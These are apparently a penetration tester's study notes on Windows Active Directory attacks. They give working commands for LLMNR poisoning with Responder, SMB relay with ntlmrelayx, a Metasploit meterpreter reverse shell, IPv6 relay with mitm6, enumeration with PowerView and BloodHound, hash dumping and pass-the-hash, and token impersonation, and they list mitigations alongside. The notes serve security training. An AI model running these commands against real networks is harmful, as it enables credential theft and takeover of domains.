# Windows Active Directory
## //cheat-sheet

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**


### What is AD?

* Directory service developed by Microsoft Windows to manage Windows domain networks.

#### What does it do?

* Stores information related to objects, such as Computers, Users, Printers, etc.

#### How does it work?

* Authenticates using Kerberos tickets.
* **Non-Windows** devices, such as Linux machines, firewalls, etc. can also authenticate to Active Directory via RADIUS or LDAP.
* **LDAP = Lightweight Directory Access Protocol**

#### Why to learn AD?

* AD is the most commonly used identity management system in the world!
* **It can be exploited without ever attacking patchable exploits. Instead abuse features, trusts, components and more.

### Components:

#### Domain Controllers:

* hosts a copy of the AD DS (directory store - data store)
* provides authentication and authroization services
* replicates updates to other domain controllers in the domain and forest
* allows administrative access to manage user accounts and network resources

#### AD DS Data Store

* consits of the Ntds.dit file
* which is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
* is only accessible through the domain controller processes and protocols

## Initial Attack Vectors

* first we have to find a way in to the network
* how to abuse features of Windows
* support article: **[Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)**

#### LLMNR poisoning

* **LINK LOCAL MULTICAST NAME RESOLUTION**
* used to identify hosts when DNS fails to do so
* previously ***NBT-NS***
* **key flaw is** that the the service utilizes a user's username and  NTLMv2 hash when approprietly responded to
* when we respond to this service it responds back to us with a username and a NTLMv2 password hash
* user types in something misspelled, server send us a broadcast message, we listen ***man in the middle*** attack, we respond yes and capture the username and hash then forward the request to the server. **responder** will help us with that, which is a tool from **Impacket**
* run **responder** first thing in the morning or when people come back from lunch because it needs some traffic

##### Responder:

* `python Responder.py -I tun0 -rdwv`
* **-I** is for interface
* **-rdwv** is the different types we're listening on, ***-w*** is for wpad
* ***-v*** is for verbose to see the hash more than once if it happens
* look at the ***--help*** for more info


### LLMNR poisoning Defenses

* the best defense is to disable LLMNR and NBT-NS
* if that's not possible tell them to enable Network Access Control (it's going to look for a specific MAC address and if it's not allowed then it will shut it down, the port. There are methods to bypass that too but that's another subject.)
* long and strong passwords, longer than 14 characters, mixed case characters and symbols, numbers

### SMB Relay Attack

#### Requierements

* SMB signing has to be disabled on the target
* relayed user credentials must be an admin on machine

#### Use Responder to capture and ntlmrelayx to relay

* in Responder HTTP and SMB server must be off so we can relay the request instead of responding to it
* configrue ***ntlmrelayx*** like this: `python ntlmrelayx.py -tf targets.txt -smb2support`
* all this does is identifying, it takes the relay and takes it to the target.txt file and smb2support tells it where to relay it to
* if SMB signing if off or it's on but ***not required*** and user is an admin on the relayed machine **ntlmrelayx.py will dump the SAM hashes**

#### Discover if SMB signing is disabled

* can search for a tool on github
* or with nmap: `nmap --script=smb2-security-mode.nse -p 445 IP/24`

#### If trying to get an interactive shell with ntlmrelayx

* append ***-i*** to `ntlmrelayx.py -tf targets.txt -smb2support -i
* ***-tf*** stands for ***target file***
* when running interactive see in feeds where an whic port is the one where ntlmrelayx created the interactive shell, I'll use port 11000 as an example here
* then on another tab in tty open up: `nc 127.0.0.1 11000`
* we are in an SMB shell essentially, type in `help` for available commands
* we can do many thing here, we can look at the shares, change password of current user, moving files, directories, create a mount point, upload file, etc.
* `shares` shows the available shares, then `use C$` once in, list it out `ls` and we've got access to the C: drive
* similary we can ls out the admin folder as well

#### Additionally with ntlmrelayx.py

* we can generate a payload with ***msfvenom*** like ***payload.exe*** as an example and execute it on the target machine and then set up a meterpreter listener in ***metasploit*** and get a shell on the target machine
* `ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
* or we can execute commands with the ***-c*** option
* it can be from somehting simple as `ntlmrelayx.py -tf targets.txt -c "whoami"` to a more complex reverse shell or powershell command

#### Mitigation strategies

* **ENABLE SMB SINGIN ON ALL DEVICES**
* **PRO:** completely stops the attack
* **CON:** can cause performance issues with file copies
* **DISABLE NTLM AUTHENTICATION ON NETWORK**
* **PRO:** completely stops the attack
* **CON:** if Kerberos stops working, Windows defaults back to NTLM
* **ACCOUNT TIERING**
* **PRO:** limits domain admins to specific tasks
* **CON:** enforcing the policy may be difficult
* **LOCAL ADMIN RESTRICTIONS**
* **PRO:** can prevent a lot of lateral movement
* **CON:** potential increase in the amount of service desk tickets

### IPv6 attacks

#### DNS takeover attacks via IPv6

* who's doing IPv6 DNS...? usually nobody!

#### Installing mitm6

* from github clone **[mitm6](https://github.com/fox-it/mitm6)**
* cd into your new folder: `pip3 install .` will install the requirements for us

#### Attack:

* start mitm6: `mitm6 -d domain.local` let it run
* we also need to setup a relay attack: `netlmrelayx.py -6 -t ldaps://<domain contorller's IP> -wh fakewpad.domaincontoller.local -l lootme`
* **-6** is for IPv6 IPs, **ladps** attack via LDAP Securte, **-l** for loot, create a loot file used to store information mitm6 dumps out on target
* IPv6 is sending out: who's got my DNS? it sends it out in about every 30 minutes, mitm6 is trying to relay credentials and dump out everything it can into the ***lootme*** file we set up for it

* when an admin logs in, mitm6 tries to relay the DNS through IPv6 targeting ldap and creates a new user for us
* outdside the created ***loot*** there's a file something like ***aclpwn-date.restore*** that restores everything as it was before the attack
* additional resource through these articles: **[The best of both worlds](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)** and **[Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)**

#### Mitigation:

* IPv6 poisoning absuses the fact that Windows queries for IPv6 addresses even on an IPv4-only environments.
* If you don't use IPv6 the safest way is to block DHCPv6 traffic.
* If wpad is not in use, disable it.
* Relaying LDAP and LDAPS can only be mitigated by enabling both LDAP singing and channel binding.
* Consider Administrative users to Protected users group or marking them as ***Account is sensitive*** and can not be delegated, which will prevent any impersonation of that user via delegation.

### Strategies

* begin the day with man in the middle attack or repsonder (***mitm6*** or ***Responder.py***)
* run scans to generate traffic
* if scans are taking too long, look for websites in scope (http_version)
* look for default credentials on web logins (Printers, Jenkins, etc.)
* **think outside the box**

## Post compromise enumeration

#### Domain enumeration with PowerView

* get PowerView from this **[github link](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)**
* bring PowerView over to target Windwos machine
* first cun PowerShell from terminal: `powershell -ep bypass` this bypasses the execution policy, not for security, it stops us from accidentally executing a script, so we need to bypass it
* `. .\PowerView.ps1` to initiate it
* `Get-NetDomain` information about the Domain Controller, if the system has multiple controllers then run `Get NetDomainController`
* `Get-DomainPolicy` to see all the different policies of the Domain
* `(Get-DomainPolicy)."system access"` this wil show more info on the ***system access policy*** like password policy, etc.
* `Get-NetUser` information on the users (dirty output)
* `Get-NetUser | select cn` information on users (cleaner)
* `Get-NetUser | select samaccountname` pulling down SAM account names
* `Get-NetUser | select description` same but for description
* `Get-UserProperty` showing all the properties a user might have
* `Get-UserProperty -Properties pwdlastset` when was a user's password last set
* `Get-UserProperty -Properties logoncount` **a good way to ID honeypot accounts** shows how many times a user logged in. If you see an account where a user never logged in, that might be a honeypot account. They just letting it sit there for you to try to hunt it down
* `Get-UserProperty -Properties badpwdcount` if you see too many bad passwords here that account might have had been under attack
* `Get-NetComputer` it lists out all the computers in this Domain
* `Get-NetComputer -FullData` maybe a little too much information, but it works
* `Get-NetComputer -FullData | select OperatingSystem` pulling down specific information on the Operating System, what are the server and user machines
* `Get-NetGroup` check for any interesting groups for us
* `Get-NetGroup -GroupName "Domain Admins"` sorting it out, groups for Domain Admins
* `Get-NetGroup -GroupName "Admin"` to see what admins are out there
* `Get-NetGroupMember -GroupName "Domain Admins"` will list out all our domain admins
* `Invoke-ShareFinder` a tool for finding shares, where and what is being shared
* `Get-NetGPO` shows all the group policies
* `Get-NetGPO | select displayname, whenchanged` what is going on in the network and when was it changed to learn more about the system's policies

#### Domain enumeration with Bloodhound

* once we are on the network, it downloads the data of the AD and helps us to visualize it
* `apt install bloodhound` to install it on kali
* setting it up: `neo4j console`
* open it up (see link in terminal) and change default credentials from neo4j:neo4j
* in tty: `bloodhound` then log in in the opened up browser
* let's pull some data with an injester first, using the **[invoke sharphound from Github repo](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)** 
* Invoke Sharphound goes on to the target Windows machine, so it can collect data
* run it, first powershell `powershell -ep bypass` than sharphound with `. .\SharpHound.ps1`
* `Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip`
* copy the generated file back to kali, where we will import it and review the details
* on kali upload it into Bloodhound opened browser

## Post compromise attacks

* these attacks require to have compromised the system already and have some credentials

### Pass the password attack with crackmapexec

* passing the hash around with ***crackmapexec.py*** which will throw around the captured hash and see where it sticks
* install it on kali `apt install crackmapexec`
* usage `crackmapexec --help` to get help, typically we provide a username, domain and password for now
* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password`
* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password --sam` it will try to dump the SAM file (short for SAM=Security Account Manager)
* trying to get a shell with psexec.py: `psexec.py domain/username:password@<domain_target_IP>`
* password spraying is NOT recommended on Domains becaue if you get many failed login attempts you can lock this user out of the Domain, on local accounts it's OK

### Dumping hashes with secretsdump

* it is also part of the impacket github repo
* `secretsdump.py domain/username:password@<domain_target_IP>` dumps the hashes for us

### Pass the hash attack

* NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
* copy second part of the hash then run it in crackmapexec `crackmapexec smb IP-range -u username -H paste_hash_here --local-auth`
* see it's gonna try to pass it around the network and gain access, green plus sign indicates in succeed
* psexec.py "frank castle":@192.168.57.141 -hashes <HASH here, first and second part of hash needed>

### Mitigations

* Limit account re-use
* Utilize strong passwords (> 14 characters)
* Privilege Access Management (PAC)

### Token Impersonation Attacks

#### What are tokens?

* Temporary keys that allows you to access to a system/network without having to provide credentials each time you access a file. Like cookies for computers.
* Two types:
1. Delegate - created for logging in to a machine or using Remote Desktop
2. Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.

#### Using Metasploit

* `use /exploit/windows/smb/psexec/`
* `options`
* `set rhosts <target IP>`
* `set smbdomain domain.local`
* `set smbpass password`
* `set smbuser username`
* `show targets`
* `set target 2`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `options` and set the lhost and lport

* `getuid`
* `hashdump`
* we can load incognito `load incognito`
* `help` to see options
* `list tokens`
* `impersonate token marvel\\administrator`
* `whoami` : marvel\administrator

#### Mitigation

* Limit User/Group token creation permissions
* Account tiering
* Local Admind restriction



# finish section 19/132

### Kerberoasting

![kerberoasting](images/kerberoasting.png)

* additional notes here...
